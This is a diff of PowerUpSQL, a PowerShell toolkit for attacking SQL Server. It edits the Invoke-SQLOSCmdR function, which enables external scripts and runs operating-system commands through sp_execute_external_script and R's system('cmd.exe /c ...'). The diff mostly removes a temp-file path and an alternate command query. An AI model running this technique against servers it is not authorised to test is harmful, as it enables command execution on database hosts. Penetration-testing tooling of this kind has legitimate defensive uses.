@@ -3,7 +3,7 @@
         File: PowerUpSQL.ps1
         Author: Scott Sutherland (@_nullbind), NetSPI - 2016
         Major Contributors: Antti Rantasaari and Eric Gruber
-        Version: 1.83.99
+        Version: 1.83.100
         Description: PowerUpSQL is a PowerShell toolkit for attacking SQL Server.
         License: BSD 3-Clause
         Required Dependencies: PowerShell v.2
@@ -1286,8 +1286,6 @@ Function  Invoke-SQLOSCmdR
             VERBOSE: MSSQLSRV04\SQLSERVER2014 : External scripts are disabled.
             VERBOSE: MSSQLSRV04\SQLSERVER2014 : Enabled external scripts.
             VERBOSE: MSSQLSRV04\SQLSERVER2014 : Executing command: whoami
-            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Reading command output from c:\windows\temp\OlHZP.txt
-            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Removing file c:\windows\temp\OlHZP.txt
             VERBOSE: MSSQLSRV04\SQLSERVER2014 : Disabling external scripts
             VERBOSE: MSSQLSRV04\SQLSERVER2014 : Disabling Show Advanced Options
 
@@ -1505,31 +1503,17 @@ Function  Invoke-SQLOSCmdR
                 # Check if the configuration has been change in the run state 
                 $EnabledInRunValue = Get-SQLQuery -Instance $Instance -Query "SELECT value_in_use FROM master.sys.configurations WHERE name LIKE 'external scripts enabled'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -ExpandProperty value_in_use            
                 if($EnabledInRunValue -eq 0){
-                    Write-Verbose -Message "$Instance : The 'external scripts enabled' setting is not enabled in runtime.'"
+                    Write-Verbose -Message "$Instance : The 'external scripts enabled' setting is not enabled in runtime."
                     Write-Verbose -Message "$Instance : - The SQL Server service will need to be manually restarted for the change to take effect."
                     Write-Verbose -Message "$Instance : - Not recommended unless you're the DBA."
                     $null = $TblResults.Rows.Add("$ComputerName","$Instance",'External scripts not enabled in runtime.')
                     return
                 }else{
                     Write-Verbose -Message "$Instance : The 'external scripts enabled' setting is enabled in runtime.'"
-                }
-
-                # Setup output file
-                $OutputDir = 'c:\windows\temp'
-                $OutputFile = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))
-                $OutputPath = "$outputdir\$outputfile.txt"                   
+                }            
 
                 #  Setup query to run command
                 write-verbose "$instance : Executing command: $Command"               
-                $QueryCmdExecuteAlt = 
-@"
-EXEC sp_execute_external_script
-  @language=N'R',
-  @script=N'OutputDataSet <- data.frame(system("cmd.exe /c $ComputerName",intern=T))'
-  WITH RESULT SETS (([cmd_out] text));
-GO
-"@
-
                 $QueryCmdExecute = 
 @"
 EXEC sp_execute_external_script
